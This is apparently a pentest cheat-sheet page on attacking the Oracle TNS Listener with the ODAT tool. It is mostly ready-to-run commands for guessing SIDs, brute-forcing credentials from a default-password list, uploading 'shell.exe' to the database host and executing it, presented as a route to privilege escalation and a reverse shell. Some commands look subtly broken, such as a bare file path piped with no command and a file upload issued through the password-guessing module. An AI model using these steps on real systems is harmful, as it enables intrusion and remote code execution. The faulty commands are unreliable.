# Oracle TNS Listener - 1521,1522,1529

## ODAT

{% embed url="https://github.com/quentinhardy/odat" %}

**ODAT** \(Oracle Database Attacking Tool\) is an open-source **penetration testing** tool that tests the security of **Oracle Databases remotely**.

Usage examples of ODAT:

* You have an Oracle database listening remotely and want to find valid **SIDs** and **credentials** in order to connect to the database
* You have a valid Oracle account on a database and want to **escalate your privileges** to become DBA or SYSDBA
* You have an Oracle account and you want to **execute system commands** \(e.g. **reverse shell**\) in order to move forward on the operating system hosting the database

Tested on Oracle Database **10g**, **11g**, **12c**, **18c,** and **19c**.

Your Oracle version:

```text
ls /usr/local/lib/oracle
```

Wiki of ODAT:

{% embed url="https://github.com/quentinhardy/odat/wiki" %}

### Find Valid Credentials

You can do SID guessing attack with the following command:

```
python3 odat.py sidguesser -s <IP>
```

Dictionary

```text
/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv | tr ' ' '/' | tail -n 50 > passwords.txt
```

After finding a valid SID:

```text
python3 odat.py passwordguesser -s <IP> -d <SID> --accounts-file passwords.txt
```

### Upload Files

```text
# No sysdba
python3 odat.py passwordguesser -s <IP> -d <SID> -U "username" -P "password" --putFile /Temp shell.exe shell.exe
# Use sysdba
python3 odat.py passwordguesser -s <IP> -d <SID> -U "username" -P "password" --putFile /Temp shell.exe shell.exe --sysdba
```

### Execute Commands

```text
# No sysdba
python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe
# Use sysdba
python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe --sysdba
```



